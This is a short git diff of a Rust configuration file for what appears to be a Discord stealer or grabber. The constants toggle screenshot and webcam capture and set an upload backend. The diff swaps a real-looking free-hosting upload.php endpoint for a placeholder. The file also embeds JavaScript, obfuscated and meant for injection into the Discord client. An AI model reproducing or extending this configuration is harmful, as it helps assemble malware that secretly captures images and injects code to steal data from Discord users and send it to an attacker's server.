@@ -28,7 +28,7 @@ pub const SCREENSHOT: bool = false;
 pub const WEBCAM_IMAGE: bool = false;
 
 // Change this to your backend
-pub const BACKEND: &'static str = "https://unsliced-deployment.000webhostapp.com/upload.php";
+pub const BACKEND: &'static str = "[ENTER-BACKEND]";
 
 // Code to inject to discord (obfuscated with https://www.preemptive.com/products/jsdefender/online-javascript-obfuscator-demo/)
 pub const INJECT_CODE: &'static str = include_str!("../assets/inject.js");
